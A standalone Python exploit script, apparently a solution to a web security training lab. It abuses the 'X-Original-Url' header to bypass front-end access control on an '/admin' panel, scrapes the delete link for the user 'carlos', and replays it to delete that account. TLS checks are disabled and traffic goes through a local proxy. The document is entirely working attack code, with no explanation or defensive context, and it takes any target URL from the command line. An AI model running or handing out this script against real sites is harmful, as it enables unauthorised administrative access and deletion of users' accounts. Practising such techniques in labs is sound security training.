import requests
import sys
import re
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http":"http://127.0.0.1:8087", "https":"http://127.0.0.1:8087"}

def broken_authentification_exploit(session, url) :
    
    headers = {'X-Original-Url':'/admin'}
    
    r = session.get(url, headers=headers, verify=False, proxies=proxies)
    
    if "carlos" in r.text :
        
        print("(+)Successfully bypass the admin panel protection.")
        print('(+) Deleting the carlos user...')
        
        matches = re.search(r'\<a href="(.*carlos)"\>Delete\<\/a\>', r.text)
        
        if matches :
            delete_path = matches.group(1)
            data = delete_path.split('?')
            
            base_url = data[0]
            query_parameters = data[1]
            
            carlos_url = url + '/?' + query_parameters
            headers = {"X-Original-Url":base_url}
            
            r = session.get(carlos_url, headers=headers, verify=False, proxies=proxies)
            
            print("(+) The carlos user has been deleted with success.")
        else:
            print("(-) Could retrieve the delete url.")
            sys.exit(-1) 
    else :
        print("Could not retrieve the carlos user!")
        sys.exit(-1)
if __name__ == "__main__" :
    try :
        url = sys.argv[1].strip()
    except IndexError :
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)
        
    session = requests.Session()
    broken_authentification_exploit(session, url)